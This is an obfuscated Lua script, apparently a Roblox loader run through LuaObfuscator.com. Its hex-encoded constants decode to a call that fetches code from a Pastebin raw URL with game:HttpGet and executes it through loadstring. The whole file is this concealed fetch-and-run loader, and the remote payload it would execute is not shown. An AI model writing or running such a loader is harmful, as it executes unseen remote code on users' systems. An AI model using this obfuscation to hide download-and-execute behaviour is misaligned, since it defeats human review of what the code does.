--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v91=0;local v92;while true do if (v91==0) then v92=v2(v0(v30,16));if v19 then local v122=0;local v123;while true do if (v122==1) then return v123;end if (v122==0) then v123=v5(v92,v19);v19=nil;v122=1;end end else return v92;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v93=0 -0 ;local v94;while true do if (v93==(877 -(282 + 595))) then v94=(v31/((5 -(1640 -(1523 + 114)))^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-1)) + (932 -(857 + 74)))) ;return v94-(v94%(569 -(367 + 201))) ;end end else local v95=(2 + 0)^(v32-(928 -(214 + 713))) ;return (((v31%(v95 + v95))>=v95) and (1 + 0)) or (0 + 0) ;end end local function v21() local v34=0 -0 ;local v35;while true do if (v34==1) then return v35;end if (v34==(1065 -(68 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + 1044)) ;v34=(121 -(32 + 85)) -3 ;end end end local function v22() local v36=0 + 0 ;local v37;local v38;while true do if (v36==(1 + 0)) then return (v38 * 256) + v37 ;end if (v36==(957 -(892 + (118 -53)))) then v37,v38=v1(v16,v18,v18 + 2 );v18=v18 + (4 -2) ;v36=(351 -(87 + 263)) -0 ;end end end local function v23() local v39=0;local v40;local v41;local v42;local v43;while true do if (v39==(181 -(67 + 113))) then return (v43 * 16777216) + (v42 * (48056 + 17480)) + (v41 * (628 -(674 -302))) + v40 ;end if ((0 + 0)==v39) then v40,v41,v42,v43=v1(v16,v18,v18 + (11 -8) );v18=v18 + (956 -(802 + 150)) ;v39=2 -1 ;end end end local function v24() local v44=v23();local v45=v23();local v46=1 + 0 ;local v47=(v20(v45,998 -(915 + 82) ,20) * ((5 -3)^(19 + 13))) + v44 ;local v48=v20(v45,27 -6 ,54 -23 );local v49=((v20(v45,1219 -((3902 -2833) + 118) )==(439 -(145 + 293))) and  -(2 -(3 -2))) or ((860 -(814 + 45)) -0) ;if (v48==(0 + 0)) then if (v47==(0 -(0 -0))) then return v49 * 0 ;else v48=1 + 0 ;v46=772 -(201 + 571) ;end elseif (v48==((153 + 2685) -(368 + 423))) then return ((v47==(0 -0)) and (v49 * (((7 + 12) -(10 + 8))/(0 -(885 -(261 + 624)))))) or (v49 * NaN) ;end return v8(v49,v48-(1465 -(416 + 26)) ) * (v46 + (v47/((2 + 0)^52))) ;end local function v25(v50) local v51;if  not v50 then local v96=(0 + 0) -0 ;while true do if (v96==(1080 -(1020 + 60))) then v50=v23();if (v50==(1423 -(630 + (2729 -1936)))) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;local v52={};for v68=4 -3 , #v51 do v52[v68]=v2(v1(v3(v51,v68,v68)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return function(v97,v98,v99,v100,v101,v102,v103,v104,v105) local v106=(function() return 0;end)();local v97=(function() return;end)();local v98=(function() return;end)();while true do if (v106==(0 + 0)) then local v118=(function() return 836 -(660 + 176) ;end)();while true do if (v118~=(1 + 0)) then else v106=(function() return 1;end)();break;end if (v118==(202 -(14 + 188))) then v97=(function() return 0;end)();v98=(function() return nil;end)();v118=(function() return 1;end)();end end end if (v106~=1) then else local v119=(function() return 0;end)();while true do if (0~=v119) then else while true do if (v97~=0) then else v98=(function() return v99();end)();if (v100(v98, #"/", #"}")~=(675 -(534 + 141))) then else local v145=(function() return 0;end)();local v146=(function() return;end)();local v147=(function() return;end)();local v148=(function() return;end)();while true do if ((2 + 1)==v145) then if (v100(v147, #"xxx", #"gha")~= #":") then else v148[ #"xnxx"]=(function() return v103[v148[ #"http"]];end)();end v104[v105]=(function() return v148;end)();break;end if (v145==2) then if (v100(v147, #"]", #"}")== #"/") then v148[2 + 0 ]=(function() return v103[v148[2]];end)();end if (v100(v147,2 + 0 ,3 -1 )== #"[") then v148[ #"xnx"]=(function() return v103[v148[ #"-19"]];end)();end v145=(function() return 4 -1 ;end)();end if (v145~=1) then else v148=(function() return {v101(),v101(),nil,nil};end)();if (v146==0) then local v189=(function() return 0;end)();local v190=(function() return;end)();while true do if ((0 -0)~=v189) then else v190=(function() return 0 + 0 ;end)();while true do if (v190~=(0 + 0)) then else v148[ #"xxx"]=(function() return v101();end)();v148[ #"0313"]=(function() return v101();end)();break;end end break;end end elseif (v146== #",") then v148[ #"91("]=(function() return v102();end)();elseif (v146==(398 -(115 + 281))) then v148[ #"-19"]=(function() return v102() -((4 -2)^(14 + 2)) ;end)();elseif (v146~= #"91(") then else local v195=(function() return 0;end)();local v196=(function() return;end)();while true do if (v195==0) then v196=(function() return 0;end)();while true do if (v196==(0 -0)) then v148[ #"xnx"]=(function() return v102() -((7 -5)^16) ;end)();v148[ #"?id="]=(function() return v101();end)();break;end end break;end end end v145=(function() return 869 -(550 + 317) ;end)();end if (v145==(0 -0)) then local v185=(function() return 0 -0 ;end)();while true do if ((2 -1)==v185) then v145=(function() return 286 -(134 + 151) ;end)();break;end if (v185==(1665 -(970 + 695))) then v146=(function() return v100(v98,3 -1 , #"xxx");end)();v147=(function() return v100(v98, #".com",6);end)();v185=(function() return 1;end)();end end end end end break;end end return v97,v98,v99,v100,v101,v102,v103,v104,v105;end end end end end;end)();local v54=(function() return function(v107,v108,v109) local v110=(function() return 1990 -(582 + 1408) ;end)();local v111=(function() return;end)();while true do if (v110==(0 -0)) then v111=(function() return 0 -0 ;end)();while true do if (v111~=(0 -0)) then else v107[v108-#"]" ]=(function() return v109();end)();return v107,v108,v109;end end break;end end end;end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {v55,v56,nil,v57};end)();local v59=(function() return v23();end)();local v60=(function() return {};end)();for v70= #",",v59 do local v71=(function() return 0;end)();local v72=(function() return;end)();local v73=(function() return;end)();local v74=(function() return;end)();while true do if (v71~=0) then else v72=(function() return 1824 -(1195 + 629) ;end)();v73=(function() return nil;end)();v71=(function() return 1 -0 ;end)();end if (v71==(242 -(187 + 54))) then v74=(function() return nil;end)();while true do if (v72~=(781 -(162 + 618))) then else if (v73== #":") then v74=(function() return v21()~=0 ;end)();elseif (v73==2) then v74=(function() return v24();end)();elseif (v73== #"-19") then v74=(function() return v25();end)();end v60[v70]=(function() return v74;end)();break;end if (v72==(0 + 0)) then local v125=(function() return 0 + 0 ;end)();local v126=(function() return;end)();while true do if (v125==(0 -0)) then v126=(function() return 0 -0 ;end)();while true do if (v126==(1 + 0)) then v72=(function() return 1637 -(1373 + 263) ;end)();break;end if (v126==0) then v73=(function() return v21();end)();v74=(function() return nil;end)();v126=(function() return 1001 -(451 + 549) ;end)();end end break;end end end end break;end end end v58[ #"xnx"]=(function() return v21();end)();for v75= #"~",v23() do FlatIdent_27404,Descriptor,v21,v20,v22,v23,v60,v55,v75=(function() return v53(FlatIdent_27404,Descriptor,v21,v20,v22,v23,v60,v55,v75);end)();end for v76= #" ",v23() do v56,v76,v28=(function() return v54(v56,v76,v28);end)();end return v58;end local function v29(v62,v63,v64) local v65=v62[1 + 0 ];local v66=v62[2 -0 ];local v67=v62[4 -(1 + 0) ];return function(...) local v77=v65;local v78=v66;local v79=v67;local v80=v27;local v81=1385 -(746 + (1895 -(1043 + 214))) ;local v82= -1;local v83={};local v84={...};local v85=v12("#",...) -(1 -0) ;local v86={};local v87={};for v112=341 -(218 + 123) ,v85 do if (v112>=v79) then v83[v112-v79 ]=v84[v112 + (1582 -(1535 + 46)) ];else v87[v112]=v84[v112 + 1 ];end end local v88=(v85-v79) + 1 + 0 ;local v89;local v90;while true do local v113=0;while true do if ((0 + 0)==v113) then v89=v77[v81];v90=v89[561 -(306 + 254) ];v113=1;end if ((1432<3555) and (v113==(1 + 0))) then if ((v90<=(11 -8)) or (2874<2181)) then if ((v90<=(1 -0)) or (1065>3578)) then if (v90==0) then v87[v89[1469 -((2111 -(323 + 889)) + 568) ]]();else local v128=v89[(5 -3) + 0 ];local v129=v87[v89[7 -4 ]];v87[v128 + ((1184 -(361 + 219)) -(268 + 335)) ]=v129;v87[v128]=v129[v89[(614 -(53 + 267)) -(14 + 46 + 230) ]];end elseif ((v90>2) or (4795<1407)) then local v133=572 -(426 + 146) ;local v134;local v135;local v136;local v137;local v138;while true do if (v133==(1 + 4)) then v134=1456 -(282 + (1587 -(15 + 398))) ;for v181=v138,v82 do v134=v134 + (983 -(18 + 964)) ;v87[v181]=v135[v134];end v81=v81 + 1 ;v89=v77[v81];v138=v89[813 -(569 + 242) ];v133=6;end if (v133==(0 -(0 -0))) then v134=nil;v135,v136=nil;v137=nil;v138=nil;v87[v89[1 + 1 ]]={};v133=1025 -(706 + 185 + 133) ;end if (v133==(1254 -(721 + 530))) then v87[v138 + (1272 -(945 + 326)) ]=v137;v87[v138]=v137[v89[9 -5 ]];v81=v81 + 1 + 0 ;v89=v77[v81];v87[v89[702 -(271 + 429) ]]=v89[3 + 0 ];v133=(948 + 556) -(1408 + 92) ;end if (((1853<4813) and (2==v133)) or (2689<=343)) then v87[v89[1088 -((1311 -(20 + 830)) + 625) ]]=v64[v89[1291 -(776 + 217 + 295) ]];v81=v81 + 1 + 0 ;v89=v77[v81];v138=v89[(1299 -(116 + 10)) -(418 + 753) ];v137=v87[v89[2 + 1 ]];v133=3;end if ((4==v133) or (1869==2009)) then v81=v81 + 1 + 0 ;v89=v77[v81];v138=v89[2];v135,v136=v80(v87[v138](v13(v87,v138 + 1 + 0 ,v89[3])));v82=(v136 + v138) -(1 + 0) ;v133=5;end if (v133==(530 -(406 + 123))) then v81=v81 + (1770 -(1749 + 20)) ;v89=v77[v81];v87[v89[2]]=v64[v89[1 + 1 + 1 ]];v81=v81 + (1323 -(1249 + 73)) ;v89=v77[v81];v133=1 + 1 ;end if ((v133==(1152 -(466 + 679))) or (3546<2322)) then v89=v77[v81];do return;end break;end if (v133==(14 -8)) then v87[v138]=v87[v138](v13(v87,v138 + (2 -1) ,v82));v81=v81 + ((2639 -(542 + 196)) -((226 -120) + 1794)) ;v89=v77[v81];v87[v89[1 + 1 ]]();v81=v81 + 1 ;v133=2 + 5 ;end end else do return;end end elseif (v90<=(14 -9)) then if ((v90>4) or (2821<2431)) then v87[v89[5 -3 ]]=v64[v89[1 + 2 ]];else local v141=0;local v142;while true do if (v141==(114 -(4 + 110))) then v142=v89[586 -(29 + 28 + 190 + 337) ];v87[v142]=v87[v142](v13(v87,v142 + (1428 -((107 -66) + 1386)) ,v82));break;end end end elseif ((v90<=((279 -170) -(17 + 86))) or (2082==4773)) then v87[v89[2 + 0 ]]=v89[6 -3 ];elseif (v90==7) then local v149=v89[5 -3 ];local v150,v151=v80(v87[v149](v13(v87,v149 + (167 -(122 + 44)) ,v89[5 -2 ])));v82=(v151 + v149) -(3 -2) ;local v152=0 + (1551 -(1126 + 425)) ;for v178=v149,v82 do v152=v152 + 1 + 0 ;v87[v178]=v150[v152];end else v87[v89[3 -1 ]]={};end v81=v81 + (66 -(30 + 35)) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F635538487473776200094Q00037Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
